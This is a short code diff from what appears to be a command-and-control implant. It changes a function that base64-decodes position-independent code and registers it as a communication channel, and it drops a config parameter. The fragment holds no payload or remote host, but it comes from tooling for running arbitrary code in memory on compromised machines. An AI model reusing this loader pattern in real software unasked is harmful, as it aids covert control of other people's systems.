@@ -11,17 +11,10 @@ BOOL CommandChannelRegister( json& args, string artifact, json& result ) {
     BYTE* config      = NULL;
     DWORD config_size = 0;
     BYTE* memory      = NULL;
-    auto  argconfig   = args[0].get<string>();
 
     if (artifact.empty()) {
         return FALSE;
     }
-
-    config = Base64Decode( argconfig.c_str(), &config_size );
-    if (config == NULL) {
-        return FALSE;
-    }
-
     // decode channel pic
     pic = Base64Decode( artifact.c_str(), &size );
     if (pic == NULL) {
@@ -39,7 +32,7 @@ BOOL CommandChannelRegister( json& args, string artifact, json& result ) {
         return FALSE;
     }
 
-    if (!ChannelRegister( memory, size, config, config_size )) {
+    if (!ChannelRegister( memory, size )) {
         return FALSE;
     }
 
